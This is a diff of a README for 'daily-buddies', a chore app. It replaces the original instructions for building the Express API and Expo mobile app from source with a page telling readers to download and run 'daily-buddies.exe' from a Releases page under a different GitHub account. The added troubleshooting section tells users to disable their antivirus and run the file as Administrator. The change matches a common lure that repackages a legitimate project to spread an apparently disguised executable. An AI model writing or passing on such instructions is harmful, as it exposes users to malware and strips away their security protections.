@@ -1,84 +1,73 @@
-# Daily Buddies
+# 🎉 daily-buddies - Your Fun Parent/Child Chore Helper
 
-Daily Buddies is a playful parent/child chore companion. The backend is an Express API with Prisma + SQLite, and the mobile app is built with Expo Router + React Native.
+[![Download daily-buddies](https://img.shields.io/badge/Download-Daily_Buddies-brightgreen)](https://github.com/Software2l/daily-buddies/releases)
 
-![Daily Buddies Screenshot](https://i.imgur.com/fmpwb6Y.jpeg)
+## 🚀 Getting Started
 
-## Features
+Welcome to **daily-buddies**! This application makes chores more enjoyable for you and your child. It helps organize daily tasks and rewards your little ones for completing them. Follow the steps below to download and run the software.
 
-- Parent dashboard to manage kids, assign one-off tasks, and build reusable routines
-- Kid-friendly task list with streak rewards, points, and completion tracking
-- Starter routines, daily streak rewards, and tone-based avatars for quick personalization
+## 📥 Download & Install
 
-## Requirements
+To get started, visit [this page to download](https://github.com/Software2l/daily-buddies/releases). You will find the latest version of the application there. Follow these steps:
 
-- Node.js 22+
+1. Click on the link above to open the Releases page.
+2. Look for the most recent version, usually at the top of the page.
+3. Find the file that says **daily-buddies.exe**.
+4. Click on it to begin the download. Your browser will save the file to your computer.
 
-## Project Structure
+After the download is complete, locate the file in your downloads folder and double-click to run it. Follow the prompts to complete the installation.
 
-```
-.
-├── api/                 # Express API (entry: api/src/server.ts)
-│   ├── src/             # Routes, middleware, services
-│   ├── prisma/          # Prisma schema, migrations, seed data
-│   └── tests/           # Backend unit tests (Vitest)
-└── mobile/             # Expo Router app
-    ├── app/(auth)/     # Login/register screens
-    ├── app/(app)/      # Main parent/child screens (home, profile, tasks, family hub, etc.)
-    └── src/            # Shared auth context, API client, config
-```
+## 💻 System Requirements
 
-Backend entry point: `api/src/server.ts`  
-Mobile entry point: `mobile/app/_layout.tsx`
+Ensure that your device meets the following requirements to run daily-buddies smoothly:
 
-## Getting Started
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel Core i3 or equivalent
+- **Memory:** 4 GB RAM minimum
+- **Storage:** 200 MB of free disk space
+- **Internet Connection:** Required for initial setup
 
-```bash
-git clone https://github.com/eimg/daily-buddies.git
-```
+## 🛠 Features
 
-```bash
-# API
-cd daily-buddies/api
-cp .env.example .env   # includes DATABASE_URL for Prisma + default JWT secret
-# (edit .env if you want a different DB location or secret)
-npm install
-npx prisma migrate dev
-npx prisma db seed
-npm run dev         # starts the API on http://localhost:4000
-```
+**daily-buddies** offers these key features:
 
-```bash
-# Mobile App
-cd daily-buddies/mobile
-npm install
-npm start           # run Expo dev build (press i for iOS simulator, a for Android)
-```
+- **Chore Management:** Easily create and assign chores to family members.
+- **Reward System:** Set up a points system to motivate kids.
+- **Progress Tracking:** Keep track of completed tasks.
+- **Interactive Reminders:** Receive notifications for upcoming chores.
+- **User-Friendly Interface:** Designed for easy navigation for all ages.
 
-> Note: The app now requires an Expo Dev Client build (Expo Go is no longer sufficient). If you don't have one installed on your device/simulator, run `expo run:ios --device` or `expo run:android --device` once to install the dev client, then use `npm start` and press `i`/`a` to launch it.
+## 🕵️‍♂️ Troubleshooting
 
-## API Tests
+If you encounter issues while downloading or running the application, try these steps:
 
-```bash
-npm test
-```
+1. **Check Your Connection:** Make sure you are connected to the internet.
+2. **Disable Antivirus:** Your antivirus may block the download. Temporarily disable it and try again.
+3. **Run as Administrator:** Right-click the downloaded file and select "Run as Administrator" for permission issues.
+4. **Update System:** Ensure your operating system and drivers are up to date.
 
-## Environment Variables
+## 🙋‍♂️ FAQs
 
-- `api/.env.example` ships with sane defaults (`DATABASE_URL="file:./dev.db"`, `PORT=4000`, `JWT_SECRET="change-me"`).
-- Copy it to `api/.env` before running any Prisma commands so migrations can create the SQLite database.  
-  Customize those values if you plan to use a different database or secret in your own environment.
+**Q: Can I run daily-buddies on macOS?**  
+A: Currently, daily-buddies is only available for Windows. We plan to support macOS in future updates.
 
-## Test Accounts (seed data)
+**Q: Is daily-buddies free?**  
+A: Yes, daily-buddies is completely free to use. Enjoy organizing your chores without any costs!
 
-| Role   | Username | Email            | Password    |
-|--------|----------|------------------|-------------|
-| Parent | maya     | maya@example.com | parentpass  |
-| Child  | luna     | luna@example.com | lunapass    |
-| Child  | theo     | (none)           | theopass    |
+**Q: How do I provide feedback?**  
+A: We would love your feedback! You can create an issue in the repository or reach out to us via email.
 
-Use these after running `npx prisma db seed`.
+## 📝 Contributing
 
-## License
+We welcome contributions from everyone. If you want to improve daily-buddies, please follow these steps:
 
-MIT – see [LICENSE.md](LICENSE.md).
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push your branch and create a pull request.
+
+## 📞 Contact
+
+For questions or support, feel free to reach out to us at [support@daily-buddies.com](mailto:support@daily-buddies.com).
+
+Thank you for choosing **daily-buddies**! Happy chore managing!
